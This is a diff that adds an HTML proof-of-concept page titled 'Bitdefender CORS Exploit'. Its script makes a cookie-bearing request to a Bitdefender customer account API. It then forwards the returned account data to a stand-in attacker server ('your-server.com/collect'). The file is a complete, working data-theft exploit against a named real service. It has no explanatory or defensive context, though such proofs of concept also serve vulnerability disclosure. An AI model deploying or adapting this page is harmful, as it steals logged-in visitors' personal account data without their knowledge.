@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bitdefender CORS Exploit</title>
+</head>
+<body>
+    <script>
+        // URL of the vulnerable API endpoint
+        const url = 'https://api.customerzone.bitdefender.com/v1/account/me';
+
+        // Send the request to the vulnerable API
+        fetch(url, {
+            method: 'GET',
+            credentials: 'include' // Send cookies with the request
+        })
+        .then(response => response.json()) // Parse the response as JSON
+        .then(data => {
+            // Send the data to your server
+            fetch('https://your-server.com/collect', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data) // Send the data as a JSON string
+            });
+        })
+        .catch(error => console.error('Error:', error));
+    </script>
+</body>
+</html>
